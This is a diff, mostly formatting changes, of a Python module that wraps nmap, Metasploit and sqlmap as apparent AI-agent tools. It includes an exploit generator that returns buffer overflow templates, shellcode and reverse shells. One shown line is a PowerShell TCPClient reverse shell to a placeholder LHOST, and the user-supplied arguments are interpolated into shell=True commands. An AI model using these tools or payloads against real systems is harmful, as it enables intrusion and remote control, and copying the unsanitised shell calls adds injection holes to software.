@@ -13,32 +13,36 @@ from pydantic import BaseModel, Field
 import xml.etree.ElementTree as ET
 import re
 
+
 class KaliToolsIntegration:
     """Integration with Kali Linux penetration testing tools"""
-    
+
     def __init__(self):
         self.tools_path = {
-            'nmap': '/usr/bin/nmap',
-            'metasploit': '/usr/bin/msfconsole',
-            'sqlmap': '/usr/bin/sqlmap',
-            'nikto': '/usr/bin/nikto',
-            'dirb': '/usr/bin/dirb',
-            'gobuster': '/usr/bin/gobuster',
-            'hydra': '/usr/bin/hydra',
-            'john': '/usr/bin/john',
-            'hashcat': '/usr/bin/hashcat',
-            'wireshark': '/usr/bin/wireshark',
-            'tcpdump': '/usr/bin/tcpdump'
+            "nmap": "/usr/bin/nmap",
+            "metasploit": "/usr/bin/msfconsole",
+            "sqlmap": "/usr/bin/sqlmap",
+            "nikto": "/usr/bin/nikto",
+            "dirb": "/usr/bin/dirb",
+            "gobuster": "/usr/bin/gobuster",
+            "hydra": "/usr/bin/hydra",
+            "john": "/usr/bin/john",
+            "hashcat": "/usr/bin/hashcat",
+            "wireshark": "/usr/bin/wireshark",
+            "tcpdump": "/usr/bin/tcpdump",
         }
+
 
 class NmapScannerTool(BaseTool):
     name: str = "Nmap Network Scanner"
     description: str = "Advanced network scanning and reconnaissance using Nmap"
-    
-    def _run(self, target: str, scan_type: str = "basic", ports: str = "1-65535") -> str:
+
+    def _run(
+        self, target: str, scan_type: str = "basic", ports: str = "1-65535"
+    ) -> str:
         """
         Run Nmap scan on target
-        
+
         Args:
             target: Target IP, hostname, or network range
             scan_type: Type of scan (basic, aggressive, stealth, vuln)
@@ -58,28 +62,38 @@ class NmapScannerTool(BaseTool):
                 cmd = f"nmap -sn {target}"
             else:
                 cmd = f"nmap -sS -sV -p {ports} {target}"
-            
+
             # Execute scan
-            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=300)
-            
+            result = subprocess.run(
+                cmd, shell=True, capture_output=True, text=True, timeout=300
+            )
+
             if result.returncode == 0:
                 return f"Nmap scan completed successfully:\n\n{result.stdout}"
             else:
                 return f"Nmap scan failed:\n{result.stderr}"
-                
+
         except subprocess.TimeoutExpired:
             return "Nmap scan timed out after 5 minutes"
         except Exception as e:
             return f"Error running Nmap scan: {str(e)}"
 
+
 class MetasploitTool(BaseTool):
     name: str = "Metasploit Framework"
     description: str = "Advanced exploitation framework for penetration testing"
-    
-    def _run(self, action: str, target: str = "", exploit: str = "", payload: str = "", options: str = "") -> str:
+
+    def _run(
+        self,
+        action: str,
+        target: str = "",
+        exploit: str = "",
+        payload: str = "",
+        options: str = "",
+    ) -> str:
         """
         Execute Metasploit commands
-        
+
         Args:
             action: Action to perform (search, exploit, generate_payload, scan)
             target: Target IP or hostname
@@ -98,27 +112,30 @@ class MetasploitTool(BaseTool):
                 cmd = f"msfconsole -q -x 'use auxiliary/scanner/portscan/tcp; set RHOSTS {target}; run; exit'"
             else:
                 return "Invalid action. Use: search, exploit, generate_payload, or scan"
-            
-            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=300)
-            
+
+            result = subprocess.run(
+                cmd, shell=True, capture_output=True, text=True, timeout=300
+            )
+
             if result.returncode == 0:
                 return f"Metasploit command executed:\n\n{result.stdout}"
             else:
                 return f"Metasploit command failed:\n{result.stderr}"
-                
+
         except subprocess.TimeoutExpired:
             return "Metasploit command timed out"
         except Exception as e:
             return f"Error executing Metasploit command: {str(e)}"
 
+
 class SQLMapTool(BaseTool):
     name: str = "SQLMap SQL Injection Tool"
     description: str = "Automated SQL injection and database takeover tool"
-    
+
     def _run(self, url: str, action: str = "detect", options: str = "") -> str:
         """
         Run SQLMap against target URL
-        
+
         Args:
             url: Target URL to test
             action: Action to perform (detect, dump, shell, os_shell)
@@ -137,27 +154,36 @@ class SQLMapTool(BaseTool):
                 cmd = f"sqlmap -u '{url}' --batch --dbs {options}"
             else:
                 cmd = f"sqlmap -u '{url}' --batch {options}"
-            
-            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=600)
-            
+
+            result = subprocess.run(
+                cmd, shell=True, capture_output=True, text=True, timeout=600
+            )
+
             if result.returncode == 0:
                 return f"SQLMap scan completed:\n\n{result.stdout}"
             else:
                 return f"SQLMap scan failed:\n{result.stderr}"
-                
+
         except subprocess.TimeoutExpired:
             return "SQLMap scan timed out"
         except Exception as e:
             return f"Error running SQLMap: {str(e)}"
 
+
 class CustomExploitTool(BaseTool):
     name: str = "Custom Exploit Generator"
     description: str = "Generate custom exploits and payloads"
-    
-    def _run(self, exploit_type: str, target_os: str = "linux", target_arch: str = "x64", options: str = "") -> str:
+
+    def _run(
+        self,
+        exploit_type: str,
+        target_os: str = "linux",
+        target_arch: str = "x64",
+        options: str = "",
+    ) -> str:
         """
         Generate custom exploits and payloads
-        
+
         Args:
             exploit_type: Type of exploit (buffer_overflow, format_string, rop_chain, shellcode)
             target_os: Target operating system
@@ -175,11 +201,13 @@ class CustomExploitTool(BaseTool):
                 return self._generate_reverse_shell(target_os, options)
             else:
                 return "Unknown exploit type. Available: buffer_overflow, shellcode, rop_chain, reverse_shell"
-                
+
         except Exception as e:
             return f"Error generating exploit: {str(e)}"
-    
-    def _generate_buffer_overflow(self, target_os: str, target_arch: str, options: str) -> str:
+
+    def _generate_buffer_overflow(
+        self, target_os: str, target_arch: str, options: str
+    ) -> str:
         """Generate buffer overflow exploit template"""
         template = f"""
 #!/usr/bin/env python3
@@ -222,8 +250,10 @@ except Exception as e:
     print(f"[-] Exploit failed: {{e}}")
 """
         return f"Buffer overflow exploit generated:\n\n```python{template}```"
-    
-    def _generate_shellcode(self, target_os: str, target_arch: str, options: str) -> str:
+
+    def _generate_shellcode(
+        self, target_os: str, target_arch: str, options: str
+    ) -> str:
         """Generate shellcode"""
         if target_os.lower() == "linux" and target_arch == "x64":
             shellcode = """
@@ -243,9 +273,9 @@ shellcode = (
 """
         else:
             shellcode = f"# Custom shellcode for {target_os} {target_arch}\n# Replace with appropriate shellcode"
-        
+
         return f"Shellcode generated:\n\n```python{shellcode}```"
-    
+
     def _generate_reverse_shell(self, target_os: str, options: str) -> str:
         """Generate reverse shell payload"""
         if target_os.lower() == "linux":
@@ -282,13 +312,9 @@ powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('%LHOST%',
 """
         else:
             shell = f"# Custom reverse shell for {target_os}\n# Replace with appropriate payload"
-        
+
         return f"Reverse shell generated:\n\n```bash{shell}```"
 
+
 # Export all tools
-kali_tools = [
-    NmapScannerTool(),
-    MetasploitTool(),
-    SQLMapTool(),
-    CustomExploitTool()
-]
+kali_tools = [NmapScannerTool(), MetasploitTool(), SQLMapTool(), CustomExploitTool()]
